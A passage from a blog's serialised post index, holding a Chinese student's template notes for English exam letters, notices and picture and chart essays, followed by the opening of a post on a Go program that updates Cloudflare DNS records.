href=\"#个人\" class=\"headerlink\" title=\"个人\"></a>个人</h3><p><strong>上学、工作</strong></p>\n<p>Dear XX,<br>    On receipt of your letter on 日期, I hereby(在此) am writing to give my advice with regard to 事由.<br>    xx will be a golden opportunity / golden period of time for you to explore the unknown and broaden your horizon. In this light, you first need to realize that accumulating relevant knowledge would be the first task to ensure success. Secondly, in the foreseeable future, it will be beneficial if you can get along well with your peers(同龄人，周围的人). Still, it is also advisable to familiarize (yourself with )and comply with the regulations there.<br>    I hope you will find the above mentioned useful and practical. Thanks for taking your time reading this letter. I wish you all the very best.<br>                Yours sincerely,<br>                    Li Ming</p>\n<h3 id=\"团体\"><a href=\"#团体\" class=\"headerlink\" title=\"团体\"></a>团体</h3><p><strong>共享单车随处停放、食堂、图书馆</strong></p>\n<p>Dear XX,<br>    I am sb. of XX university. I’m writing this letter to show my serious concern about and suggestions for 某个问题(the problem that…).<br>    It is heartbreaking to see that xx问题is deteriorating / xx问题 has not aroused due attention. To address the problem, 机构, at the first place, is responsible for setting up effective retulations to ensure a sound atmosphere(良好的氛围) for all. Moreover, it is advisable to clutive(树立，培养) among all its members a correct attitude toward service / consumption / environment / health / … . Last but not the least, it is high time(是时候做…) that the 团体 organized various activities on a regular basis to improve the status quo(改善现状).<br>    Thank you for taking your busy schedule to read my letter. I’m eager to witness a speedy solution(快速的解决) of the problem.<br>                Yours sincerely,<br>                    Li Ming</p>\n<h2 id=\"咨询信\"><a href=\"#咨询信\" class=\"headerlink\" title=\"咨询信\"></a>咨询信</h2><p><strong>学校、公司、旅社</strong></p>\n<p>Dear XX,<br>    I’m a student of xx学校. As I’ll be doing / I am extremely interested in … .I should(虚拟语气) be grateful if you would kindly provide me with some information concerning…<br>    The focus of my question are as follows. First of all, as I’m a student leading an extremely regular life. I’d like to know your general schedule there. Plus, I’m wondering if there is any special requirement or favorable policies(优惠政策) for undergraduates like me. What’s more, could you please send me the relevant information / application form / a map / the detailed address of … , if it is not too much of a bother?<br>    Again, I would appreciate your taking time answering my questions. I’m expecting your early reply at your convenience.<br>                Yours sincerely,<br>                    Li Ming</p>\n<h1 id=\"通知\"><a href=\"#通知\" class=\"headerlink\" title=\"通知\"></a>通知</h1><h2 id=\"框架\"><a href=\"#框架\" class=\"headerlink\" title=\"框架\"></a>框架</h2><p>引言——2句……表明身份+表明目的<br>主体——4句……主题句——分论点1,2,3<br>结尾——2句……总结句——套话<br>落款（左下角日期，右下角组织或个人）</p>\n<h2 id=\"寻物-失物\"><a href=\"#寻物-失物\" class=\"headerlink\" title=\"寻物/失物\"></a>寻物/失物</h2><blockquote>\n<p>限官形龄色图</p>\n</blockquote>\n<p>LOST / FOUND<br>    I am a sb who stayed in 某地 for three days during the Spring Festival. I am writing this letter to ask if anyone has found / lost a wallet.<br>    Among all the features of the wallet, the following three are the most noticeable(引人注目的). First of all, it is a medium-sized black leather wallet(可换) with a small logo of prada on it. What’s in it includes an ID card, several credit cards and some cash. Needless to say, it mean a lot to me / the owner, and everything woud become a mess without it.<br>    It was (most likely寻物的时候要加) left on the table in room 2048. I would be much obliged(=appreciate) the one who found / lost it contact me at 123456.<br>                Yours sincerely,<br>                    Li Ming</p>\n<h2 id=\"招募\"><a href=\"#招募\" class=\"headerlink\" title=\"招募\"></a>招募</h2><p>XX WANTED<br>    A 某活动 is to be held for 目的 / by 主办方+时间. As it is meant to enhance communication between A and B / help those in need(那些需要帮助的人) … , we are badly in want of XX to ensure that everything would proceed smoothly(一切都进展顺利).<br>    First and foremost, applications are supposed to have sound knowledge of the field, thus undergraduates(本科生) of relevant majors are welcome to it. What’s more, those who have relevant experience are preferred(更偏重). Still, team spirit, deligence(勤奋), and dedication(献身精神) are some of the prerequisite qualities(预先要求的品质) to guarantee ideal performance(理想的表现). Other requirements include attendance and good oral English(口语).<br>    If you are interested and willing to become one of us, please do not hesitate to send your resume to 地址 / contact us before 最后期限.</p>\n<p>日期                主办方</p>\n<h2 id=\"欢迎\"><a href=\"#欢迎\" class=\"headerlink\" title=\"欢迎\"></a>欢迎</h2><p>WELCOME TO XXX<br>    Welcome to XXX! It could serve as a platform to show your outstanding ability and help you develop a range of great skills.<br>    You can be involved in a variety of activities including … . Those after-class could offer you ample opportunities to improve yourselves. First, your active participation is helpful to managing interpersonal relations(人际关系). Second, the activities could raise your level of proficiency(熟练) in XXX. A good command(掌握) of it empowers you to enjoy a great advantage over your peers in competition.<br>    You can file a written application to our staff office or email us via <a href=\"mailto:abc@163.com\" target=\"_blank\" rel=\"noopener\">abc@163.com</a>. The deadline for entry is 日期. Join us and have fun.</p>\n<p>日期                    XX<br>                    club</p>\n<h2 id=\"征稿\"><a href=\"#征稿\" class=\"headerlink\" title=\"征稿\"></a>征稿</h2><p>CONTRIBUTIONS WANTED<br>    In this day and age, nothing has aroused more than attention than 征稿主题. In the light of this(鉴于此), 杂志名/组织名 is hereby issuing a call(发布一个号召) for papers on it.<br>    All undergraduate students(本科生) are welcome to contribute articles(投稿) as long as they can meet the selection criteria（遴选标准） as follows. First and foremost, the papers must stick to 主题 and topics in relation to it. Moreover, the papers are to be（将来时表规定） written in English within 5,000 words with abstract(n.摘要 adj.抽象的) in Chinese. All papers must be original(原创的) and plagiarism(剽窃=academic theft) shall incur corresponding legal liabilities(招致法律责任).<br>    If you are interested, please submit your article before the deadline on 日期, and the contribution fee is rmb 500 per 1,000 words. We are looking forward to your participation!</p>\n<p>日期                杂志名</p>\n<h2 id=\"募捐\"><a href=\"#募捐\" class=\"headerlink\" title=\"募捐\"></a>募捐</h2><p>DONATION WANTED<br>    It is reported that sb are suffering from (the aftermath) of xx. As they are in bad need of help, 机构 is hereby calling for donation to improve their situation.<br>    All forms of contributions are welcome including cash, clothes, books, and so forth(=and the like). The donation will be handled and delivered directly to the needy ones by a professional foundation(基金会). A charity event(慈善义演) is to be helped in the auditorium(礼堂) on our campus on 日期, and donations will be collected and classified on the spot(当场).<br>    It is an excellent opportunity to repay the society. With our joint efforts and benevolence, we are bound to make thins better for them.</p>\n<p>日期                    XX机构</p>\n<h2 id=\"更正\"><a href=\"#更正\" class=\"headerlink\" title=\"更正\"></a>更正</h2><p>CORRECTION<br>    To our great regret, the xx机构 released the wrong information about the time / place / details of sth. We hereby issue the notice of correction.<br>    Originally the activity was told to be held on 日期 / sb was claimed to have done sth, but we afterwards learnt that the assembly hall(大礼堂) was still under decoration then / there will not be enough staff available then / we referred to invalid sources(参考了不可靠的信息源头，即信息不可靠), which meant that the initial plan impossible / statement unacceptable. After reaffirmation, we finally decided that xx活动 will be held on 日期 at 地点 / xx is actually xx(题目中给出的更正细节信息). We will be much obliged(感激) if you could spread the information to the people concerned.<br>    Again, we must apologize for the dreadful mistake, and we will do everything possible to make up for it. We will be happy to take any further questions(解答问题).</p>\n<p>日期                XX机构</p>\n<h1 id=\"备忘录\"><a href=\"#备忘录\" class=\"headerlink\" title=\"备忘录\"></a>备忘录</h1><h2 id=\"格式\"><a href=\"#格式\" class=\"headerlink\" title=\"格式\"></a>格式</h2><p>To:XX<br>From:XX<br>Date:Jan. 1, 2020<br>Subject:Xxxxxxx<br>    Xxx<br>    Xxx<br>    Xxx</p>\n<h2 id=\"例\"><a href=\"#例\" class=\"headerlink\" title=\"例\"></a>例</h2><p>To:收阅人<br>From:写信人<br>Data:时间<br>Subject:Make up a Plan for a Training<br>    As we discussed earlier this week, I agree with you that our faculty(教师) is in urgent need of proficiency(专业度) of multimedia devices in teaching(不能熟练使用多媒体设备). Thus, we need to make up a plan for it.<br>    I would like you to design 活动. We had better classify the teachers in groups and put them into the program according to their own levels.<br>    Write a brief proposal(建议) about your ideas of the program and present it to us in the meeting of the faculty. The presentation is suppoesd to cover every detail of the project in terms of time, place, and peoplr involved.</p>\n<h1 id=\"报告\"><a href=\"#报告\" class=\"headerlink\" title=\"报告\"></a>报告</h1><p><strong>读书、调研</strong></p>\n<p>Reading Rrport on ‘书名’<br>    Li Ming of Graduate School<br>    I have just finished reading “书名” written by sb, and I am writing to report what I have learnt from it.<br>    The book can be divided into three parts. The first one gives a brief introduction of the background information and the second one is the body of discussion. In the end, the author puts forward(提出) some convincing conclusions (by pointing out that xx is worth our grave concern). What impressed me the most was the different cultural elements demonstrated(展示) in the discussion and the author’s solid command(扎实地掌握) of language.<br>    In the end, the work is worthy of our attention in more ways than one. It casts light on the solution of the present issues and the future study of them.<br>                Yours sincerely,<br>                        Li Ming</p>\n<h1 id=\"图画作文\"><a href=\"#图画作文\" class=\"headerlink\" title=\"图画作文\"></a>图画作文</h1><h2 id=\"第一段\"><a href=\"#第一段\" class=\"headerlink\" title=\"第一段\"></a>第一段</h2><h3 id=\"第一句\"><a href=\"#第一句\" class=\"headerlink\" title=\"第一句\"></a>第一句</h3><h4 id=\"如图所示\"><a href=\"#如图所示\" class=\"headerlink\" title=\"如图所示\"></a>如图所示</h4><p>As is (1 +adv) (2 shown) in the (3 drawing) above</p>\n<ul>\n<li>1 adv:graphically（图示地） / vividly（生动地） / symbolically（深刻地） / ironically（讽刺地）</li>\n<li>2 depicted / revealed / demonstrated / displayed / illustrated</li>\n<li>3 cartoon / picture / sketch（简笔画、素描）</li>\n</ul>\n<h4 id=\"图片\"><a href=\"#图片\" class=\"headerlink\" title=\"图片\"></a>图片</h4><h5 id=\"有人的\"><a href=\"#有人的\" class=\"headerlink\" title=\"有人的\"></a>有人的</h5><p>sb (1 ) be doing sth (2 adv)</p>\n<ul>\n<li><p>1</p>\n<ul>\n<li><table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody><tr>\n<td></td>\n<td>faced with XX  (a mountain)</td>\n<td>面对</td>\n</tr>\n<tr>\n<td>sb</td>\n<td>in/on …  (例on campus, in tagged coat)</td>\n<td>属性</td>\n</tr>\n<tr>\n<td></td>\n<td>with sb/sth 介词/分词  (with a bag on his back, with a girl shopping)</td>\n<td>便随</td>\n</tr>\n</tbody></table>\n</li>\n</ul>\n</li>\n<li><p>2</p>\n<ul>\n<li><p>vigorously 起劲地</p>\n</li>\n<li><p>wholeheartedly 全心全意地</p>\n</li>\n<li><p>joyfully 开心地</p>\n</li>\n<li><p>confusedly 迷茫地</p>\n</li>\n<li><p>hesitately 迟疑地</p>\n</li>\n<li><p>helplessly 无助地</p>\n</li>\n<li><p>frustratelly 沮丧地</p>\n</li>\n<li><p>absent-mindedly 三心二意地</p>\n<p><em>An American girl, in Chinese traditional costume, is smiling sweetly.</em></p>\n<p><em>The earth, with a chimney in its mouth, is suffering from lung cancer.</em>(with smoke coming out from mouth)</p>\n<p><em>Several young people, faced with a table full of delicacies, are playing with their mobile phones concentratedly.</em></p>\n<p><em>A man on the left, faced with a spilt(or fallen) bottle, is feeling frustrated because it is alomst empty. On the other hand（万能）/On the contrary（相反）\\likewise（相同）, another man is feeling quite the opposite, because there is still some left.</em></p>\n<p><em>A boy, with his father watching TV, is studying helplessly. On the other hand, another father and his son are studying together.</em> || <em>A father sitting in front of the TV idly(悠闲的), is asking his son to study hard. On the contrary, another father and his son are studying together.</em></p>\n<p><em>two tourises faced with 美景, are littering rubbish into the rival.</em></p>\n<p><em>There ara a wild range of <u>rubbish / garbage</u> ont the lake of a place of interest, including fruit peel(果皮), one-time-off tablewares(一次性餐具), leftover(剩菜剩饭)</em></p>\n<p><em>a woman, with her daughter;s hand in hers, raised the latter thirty years ago. Likewise, …</em></p>\n</li>\n</ul>\n</li>\n</ul>\n<h5 id=\"无人的\"><a href=\"#无人的\" class=\"headerlink\" title=\"无人的\"></a>无人的</h5><p>there be (1) sth + 介词短语/修饰</p>\n<h5 id=\"例-1\"><a href=\"#例-1\" class=\"headerlink\" title=\"例\"></a>例</h5><p><em>如图所示, there used to be a large number of fishes(不同种的鱼，加es) in the sea with only one fishing boat in 1905. On the contrary, the condition in 1995 its quite the opposite.</em></p>\n<p><em>… , there are a wild range of cultural elements in a hotpot including Buddhism(佛教), Taoism(道教), Confucianism(儒教).</em></p>\n<h3 id=\"第二句\"><a href=\"#第二句\" class=\"headerlink\" title=\"第二句\"></a>第二句</h3><p><u>Actually(题目画的明显) / undoubtedly(题目画的隐晦)</u>, the drawer depicts a <u>prevalent phenomenon / heated topic</u>, namely, 主题.</p>\n<h3 id=\"第三句-可以没有\"><a href=\"#第三句-可以没有\" class=\"headerlink\" title=\"第三句(可以没有)\"></a>第三句(可以没有)</h3><ol>\n<li>我认为, it is a matter which deserves grave attention.</li>\n<li>我认为, differenct standpoints toward it may lead to results pole apart.<ul>\n<li>我认为<ul>\n<li>from where I stand</li>\n<li>as far as I’m concerned</li>\n</ul>\n</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"第二段\"><a href=\"#第二段\" class=\"headerlink\" title=\"第二段\"></a>第二段</h2><h3 id=\"首句\"><a href=\"#首句\" class=\"headerlink\" title=\"首句\"></a>首句</h3><p>The phenomenon is thought-provoking in more ways than one, among which the following three are of special significance.</p>\n<h3 id=\"分论点一\"><a href=\"#分论点一\" class=\"headerlink\" title=\"分论点一\"></a>分论点一</h3><p>First and foremost, that some people are <u>keenly(敏锐地) / not completely</u> aware of the significance（意义） / virtue（优点） / harm（带来的伤害） / whole picture（全貌） of 主题 is the psychological basis that contributes to the phenomenon. After all, it is human nature to <u>pursue self-actualization（自我价值的实现） and public recognition（公众的认可） through their conducts</u>（正面的） / <u>focus only the present interest (convenience / condition)</u>（负面的） / <u>shirk(逃避) all labor and duty if they can</u>（负面的）.</p>\n<h3 id=\"分论点二\"><a href=\"#分论点二\" class=\"headerlink\" title=\"分论点二\"></a>分论点二</h3><p>In the light of this(因此), numerous individuals, especially the ones from humble backgrounds, become typical beneficiaries / victims(受益者/受害者) in that</p>\n<ul>\n<li>they are bound to succeed <u>academically / economically</u>(学习上/经济上) more easily with 主题</li>\n<li>their <u>health / well-being(幸福) / living condition</u> can be <u>improved / at risk</u> with the <u>advent(出现) / absence(缺失)</u> of 主题</li>\n<li>they are (not) able to enjoy the best that the world can offer because of 主题</li>\n</ul>\n<h3 id=\"分论点三\"><a href=\"#分论点三\" class=\"headerlink\" title=\"分论点三\"></a>分论点三</h3><ul>\n<li>We have every reason to say that 主题 <u>boasts irreplaceable value / poses irretrievable(无法逆转的) harm to the development and harmony of the nation / the education of the next generation / environment and ecological balance(环境与生态平衡) / cultural diversity and prosperity(文化的多元与繁荣)</u>, so it is no wonder universally(=unanimously一致) acknowledged as a <u>gem(珠玉) / poison / epidemic(流行病)</u> of modern sociery.</li>\n</ul>\n<h3 id=\"末句\"><a href=\"#末句\" class=\"headerlink\" title=\"末句\"></a>末句</h3><ol>\n<li>That’s why we cannot afford to omit this phenomenon.</li>\n<li>sb. make sense in saying that …</li>\n</ol>\n<h2 id=\"第三段\"><a href=\"#第三段\" class=\"headerlink\" title=\"第三段\"></a>第三段</h2><p>From the previous discussion we can safely(万无一失的) come to the conclusion that 主题 is a <u>blessing(福) / curse(祸)</u> in more ways than one. It is high time(是时候做某事了) we cultivated(培养) a better awareness of it and channeled(引导) actions in the light of concrete circumstances(实事求是地展开行动). Bearing the previous points in mind(牢记于心), we can embrace a brighter future(营造一个光辉的未来),</p>\n<h1 id=\"图表作文\"><a href=\"#图表作文\" class=\"headerlink\" title=\"图表作文\"></a>图表作文</h1><h2 id=\"常用表达\"><a href=\"#常用表达\" class=\"headerlink\" title=\"常用表达\"></a>常用表达</h2><ul>\n<li>图标可总称为 graph</li>\n</ul>\n<h2 id=\"结构\"><a href=\"#结构\" class=\"headerlink\" title=\"结构\"></a>结构</h2><ol>\n<li>引入：描述——（破题）</li>\n<li>主体：主题——三条——结论</li>\n<li>同漫画</li>\n</ol>\n<h2 id=\"常用词\"><a href=\"#常用词\" class=\"headerlink\" title=\"常用词\"></a>常用词</h2><ul>\n<li>增加：increase, go up, incline(缓慢增加), 暴增：rocket, soar, explode</li>\n<li>减少：decrease, go down, decline, 暴跌：plunge, dwindle, shrink, sink</li>\n<li>不变：remain stable, level out(或off), remain unchanged, remain fixed</li>\n<li>波动：fluctuate, there were ipps and downs</li>\n<li>转向：the trend reversed</li>\n<li>变速：speed up, slow down; acceletare, decelerate</li>\n<li>变化程度：<ul>\n<li>大：dramatically</li>\n<li>中：considerably</li>\n<li>小：marginally</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"柱状图与曲线\"><a href=\"#柱状图与曲线\" class=\"headerlink\" title=\"柱状图与曲线\"></a>柱状图与曲线</h2><h3 id=\"常用表达-1\"><a href=\"#常用表达-1\" class=\"headerlink\" title=\"常用表达\"></a>常用表达</h3><ul>\n<li>可能描述的是变化和对比</li>\n<li>bar chart 柱状图</li>\n<li>curve 曲线图</li>\n</ul>\n<h3 id=\"模板\"><a href=\"#模板\" class=\"headerlink\" title=\"模板\"></a>模板</h3><p>As is illustrated(=demonstrated) in the graph, A 变量 （1）</p>\n<h4 id=\"过去式\"><a href=\"#过去式\" class=\"headerlink\" title=\"过去式\"></a>过去式</h4><ul>\n<li>增加: (过去式) from 数值1 to 数值2 <u>during the span of xx years / from 1998 to 2008</u>.</li>\n<li>减少: (过去式) 同上</li>\n<li>不变: stayed at 数值. Then the trend reversed / it picked up speed, finishing at 数值 at 时间.</li>\n</ul>\n<h4 id=\"例-2\"><a href=\"#例-2\" class=\"headerlink\" title=\"例\"></a>例</h4><p>As is graphically illustrated in the bar chart ,  domestic cars increased from 25% to about 30%. On the controry, Japanese cars has dwindled from 35% to 25% in Chinese market. What’s more, the American brand remained stable at 15%.</p>\n<p>As is graphically illustrated in the bar chart, the percentage of democratic cars in China’s automobile market increased considerably from 25% to 35 around(=some=appoximately=roughly) 33% during the twelve months from 2008 to 2009. On the contrary, the proportion of Japanese brands dropped from 35% to 25%. During the same time, the percentage of American cars remained stable at approximately 15%.</p>\n<p>As is pespicuously demonstrated in the bar chart senior students with part-time jobs accounted for 88.24% of the forth grade, which is the highest proportion of all groups. It is followed by that of juniors at 71.93%, and sophomores, 71.33%. Within expectation, the lowest proportion occurred in freshman at 67.77%.</p>\n<h2 id=\"饼状图与表格\"><a href=\"#饼状图与表格\" class=\"headerlink\" title=\"饼状图与表格\"></a>饼状图与表格</h2><h3 id=\"常用表达-2\"><a href=\"#常用表达-2\" class=\"headerlink\" title=\"常用表达\"></a>常用表达</h3><ul>\n<li>描述的比例</li>\n<li>pie chart 饼状图</li>\n<li>table 表格</li>\n</ul>\n<h3 id=\"模板-1\"><a href=\"#模板-1\" class=\"headerlink\" title=\"模板\"></a>模板</h3><p>As is illustrated in the graph, A变量 accounted(=demonstrated) for the highest proportion of 图标主题 at x%, followed by B变量 at y%, and C, z%.</p>\n<h4 id=\"例-3\"><a href=\"#例-3\" class=\"headerlink\" title=\"例\"></a>例</h4><p>As … , enjoying scenery accounted for the highest proportion of purpose for traveling of students in a university.</p>\n<p>As is perspicuously demonstrated in the pie chart, enjoying beautiful scenery accounted for(=make up=constitude) the highest proportion at 37% of all the students’ purpose for traveling in one university, followed by relieving pressure at 33%. Besides, making friends constituted 15%, and cultivatingindependent ability, 9%.</p>\n<h2 id=\"第一段第二句-破题\"><a href=\"#第一段第二句-破题\" class=\"headerlink\" title=\"第一段第二句(破题)\"></a>第一段第二句(破题)</h2><ul>\n<li>Actually / undoubtedly, the chart depicts a prevalent phenomenon / heated topic, namely(即), 主题.</li>\n</ul>\n<h2 id=\"第二段-1\"><a href=\"#第二段-1\" class=\"headerlink\" title=\"第二段\"></a>第二段</h2><h3 id=\"第一句-主题句\"><a href=\"#第一句-主题句\" class=\"headerlink\" title=\"第一句(主题句)\"></a>第一句(主题句)</h3><ul>\n<li>Several factors, to my way of thinking, can be easily found to account for the phenomenon among which I would like to name three most significant ones as follows.</li>\n</ul>\n<h3 id=\"分论点一-1\"><a href=\"#分论点一-1\" class=\"headerlink\" title=\"分论点一\"></a>分论点一</h3><p>At the first place, there is no denying that the erer-accelerating pace of our life and the improvement of our living standards have come to characterize(塑造) one’s <u>working / living / learning</u> habit, which in turn led to the <u>marked  change of(重大的变化) / diversified stance(不同的立场)</u> on 主题.</p>\n<h3 id=\"分论点二-1\"><a href=\"#分论点二-1\" class=\"headerlink\" title=\"分论点二\"></a>分论点二</h3><p>Moreover, that numermous individuals have been blessed with(很多人被保佑拥有) <u>concrete / academic / physical</u> benefits from 主题 also conduced to(导致) the <u>trend / situation</u>. </p>\n<h3 id=\"分论点三-1\"><a href=\"#分论点三-1\" class=\"headerlink\" title=\"分论点三\"></a>分论点三</h3><p>Still, what cannot be neglected is that the <u>government incentives(政府的推动作用) / pressure from all sides(来自各方面的压力) / eagerness to try new things(想尝试新事物的渴望)</u> served as a momentous driving force(作为一个重大的推动力) of it.</p>\n<h3 id=\"第二段末句\"><a href=\"#第二段末句\" class=\"headerlink\" title=\"第二段末句\"></a>第二段末句</h3><p>As it is a miniature(缩影) of life in this day and age, we can by no means afford to omit it.</p>\n<h2 id=\"第三段-1\"><a href=\"#第三段-1\" class=\"headerlink\" title=\"第三段\"></a>第三段</h2><h3 id=\"第一句-1\"><a href=\"#第一句-1\" class=\"headerlink\" title=\"第一句\"></a>第一句</h3><p>From the previous discussin we can safely come to the conclusion that (<u>current trend / the multiple choices / diverse considerations</u>)  of 主题 will continue to influence all aspects of our life / study / work in the long run,</p>\n<h3 id=\"第二句-1\"><a href=\"#第二句-1\" class=\"headerlink\" title=\"第二句\"></a>第二句</h3><p>It is high time we clutivated a better awareness of it and channeled actions in the light of concrete facts.Bearing the previous points in my mind, we can enjoy our life happily and meaningfully / come to the best decisions within no time.</p>\n","categories":["文学"],"tags":["英语"]},{"title":"通过API自动更新Cloudflare的DNS解析-Go语言版本","url":"https://littleghost2016.github.io/2019/12/11/通过API自动更新Cloudflare的DNS解析-Go语言版本/","content":"<h1 id=\"功能\"><a href=\"#功能\" class=\"headerlink\" title=\"功能\"></a>功能</h1><ul>\n<li><input checked disabled type=\"checkbox\"> 调用Cloudflare（下称CF）API查询域名对应的identifier和ip</li>\n<li><input checked disabled type=\"checkbox\"> 查询本地2001段IPv6地址</li>\n<li><input checked disabled type=\"checkbox\"> 通过爬虫查询路由器中的10.173段IPv4地址</li>\n<li><input checked disabled type=\"checkbox\"> 对比ip判断是否需要调用CF的API更新ip</li>\n<li><input checked disabled type=\"checkbox\"> 在Windows上设置任务计划，定时执行二进制文件</li>\n</ul>\n<h1 id=\"网络信息说明\"><a href=\"#网络信息说明\" class=\"headerlink\" title=\"网络信息说明\"></a>网络信息说明</h1><ul>\n<li>实验室路由器翼讯拨号，路由器分配<code>10.173</code>段内网IPv4地址，做端口转发。电脑被分配<code>192.168</code>段地址，但这个内网不是我想要的地址。</li>\n<li>直连校园网，被分配<code>2001</code>段IPv6地址。</li>\n</ul>\n<h1 id=\"代码结构\"><a href=\"#代码结构\" class=\"headerlink\" title=\"代码结构\"></a>代码结构</h1><figure class=\"highlight go\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 初始化http请求的client端以复用</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">initiateHttpClient</span><span class=\"params\">()</span> *<span class=\"title\">http</span>.<span class=\"title\">Client</span></span> &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 通过HTTP的GET请求获取identifier和ip</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">getIdentifierAndIp</span><span class=\"params\">(name <span class=\"keyword\">string</span>, dnsType <span class=\"keyword\">string</span>, httpClient *http.Client)</span> <span class=\"params\">(identifier <span class=\"keyword\">string</span>, ip <span class=\"keyword\">string</span>, err error)</span></span> &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 获取本机的IPv4和IPv6地址</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">getNativeIp</span><span class=\"params\">(ipType <span class=\"keyword\">string</span>)</span> <span class=\"params\">(ip <span class=\"keyword\">string</span>, err error)</span></span> &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 检查ip是否需要更新</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">checkIp</span><span class=\"params\">(identifier <span class=\"keyword\">string</span>, ip <span class=\"keyword\">string</span>, ipType <span class=\"keyword\">string</span>, httpClient *http.Client)</span> <span class=\"params\">(nativeIp <span class=\"keyword\">string</span>, updateFlag <span class=\"keyword\">bool</span>)</span></span> &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 通过HTTP的PUT请求更新ip</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">updateCloudflareDns</span><span class=\"params\">(identifier <span class=\"keyword\">string</span>, name <span class=\"keyword\">string</span>, dnsType <span class=\"keyword\">string</span>, ip <span class=\"keyword\">string</span>, httpClient *http.Client)</span> <span class=\"params\">(err error)</span></span> &#123;&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 程序入口</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">func</span> <span class=\"title\">main</span><span class=\"params\">()</span></span> &#123;&#125;</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"工作流程\"><a href=\"#工作流程\" class=\"headerlink\" title=\"工作流程\"></a>工作流程</h1><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">graph TD</span><br><span class=\"line\">A(开始) --&gt; B[初始化HTTPClient]</span><br><span class=\"line\">B --&gt; C[通过HTTP的GET请求获取identifier和ip]</span><br><span class=\"line\">B --&gt; D&#123;获取本地地址&#125;</span><br><span class=\"line\">D --&gt; |IPv4| E[模拟登录路由器获取地址]</span><br><span class=\"line\">D --&gt; |IPv6| F[调用Go语言net库提取地址]</span><br><span class=\"line\">C --&gt; G</span><br><span class=\"line\">E --&gt; G&#123;对比ip判断是否需要更新&#125;</span><br><span class=\"line\">F --&gt; G</span><br><span class=\"line\">G --&gt; |需要| H[通过HTTP的PUT请求更新ip]</span><br><span class=\"line\">G --&gt; |不需要| I(结束)</span><br><span class=\"line\">H --&gt; I</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"%E6%B5%81%E7%A8%8B%E5%9B%BE.png\" alt=\"流程图\"></p>\n<h1 id=\"Cloudflare的API中涉及的几个参数\"><a href=\"#Cloudflare的API中涉及的几个参数\" class=\"headerlink\" title=\"Cloudflare的API中涉及的几个参数\"></a>Cloudflare的API中涉及的几个参数</h1><h2 id=\"AccountID-用户ID\"><a href=\"#AccountID-用户ID\" class=\"headerlink\" title=\"AccountID - 用户ID\"></a>AccountID - 用户ID</h2><p><img src=\"AccountID-0.png\" alt></p>\n<p><img src=\"AccountID-1.png\" alt></p>\n<h2 id=\"ZoneID-域名ID\"><a href=\"#ZoneID-域名ID\" class=\"headerlink\" title=\"ZoneID - 域名ID\"></a>ZoneID - 域名ID</h2><p><img src=\"ZoneID-0.png\" alt></p>\n<h2 id=\"identifier-子域名ID\"><a href=\"#identifier-子域名ID\" class=\"headerlink\" title=\"identifier - 子域名ID\"></a>identifier - 子域名ID</h2><p>可通过<code>GET</code>请求获得，参考<code>getIdentifierAndIp</code>函数部分</p>\n<h2 id=\"API-Key\"><a href=\"#API-Key\" class=\"headerlink\" title=\"API-Key\"></a>API-Key</h2><p><img src=\"API-Key.png\" alt=\"API-Key\"></p>\n<h1 id=\"设置Win10任务计划定时执行程序\"><a href=\"#设置Win10任务计划定时执行程序\" class=\"headerlink\" title=\"设置Win10任务计划定时执行程序\"></a>设置Win10任务计划定时执行程序</h1><h2 id=\"常规设置\"><a href=\"#常规设置\" class=\"headerlink\" title=\"常规设置\"></a>常规设置</h2><p><img src=\"%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92-%E5%B8%B8%E8%A7%84.png\" alt=\"常规\"></p>\n<h2 id=\"新建触发器\"><a href=\"#新建触发器\" class=\"headerlink\" title=\"新建触发器\"></a>新建触发器</h2><p><img src=\"%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92-%E6%96%B0%E5%BB%BA%E8%A7%A6%E5%8F%91%E5%99%A8.png\" alt=\"新建触发器\"></p>\n<h2 id=\"新建操作\"><a href=\"#新建操作\" class=\"headerlink\" title=\"新建操作\"></a>新建操作</h2><p><img src=\"%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92-%E6%96%B0%E5%BB%BA%E6%93%8D%E4%BD%9C.png\" alt=\"新建操作\"></p>\n<h2 id=\"设置\"><a href=\"#设置\" class=\"headerlink\" title=\"设置\"></a>设置</h2><p><img src=\"%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92-%E8%AE%BE%E7%BD%AE.png\" alt=\"设置\"></p>\n<h2 id=\"启用所有任务历史记录\"><a href=\"#启用所有任务历史记录\" class=\"headerlink\" title=\"启用所有任务历史记录\"></a>启用所有任务历史记录</h2><p><img src=\"%E4%BB%BB%E5%8A%A1%E8%AE%A1%E5%88%92-%E4%BB%BB%E5%8A%A1%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95.png\" alt=\"任务历史记录\"></p>\n<p>刚开始设置计划任务后，除非以手动点击的方式程序才会运行一次后一直处在“准备就绪”的状态，其他时间即使过了所设置的时间点，任务也不会执行。在与<a href=\"https://github.com/canbaoafeizai\" target=\"_blank\" rel=\"noopener\">@caibaoafeizai</a>一起研究几十分钟后，貌似在打开第五步的“启用所有任务历史记录”后正常了，具体原因我们也没排查出来，汗…</p>\n<h1 id=\"值得注意的点\"><a href=\"#值得注意的点\" class=\"headerlink\" title=\"值得注意的点\"></a>值得注意的点</h1><ol>\n<li>HTTP的请求方式全部为大写，如<code>GET</code> <code>POST</code> 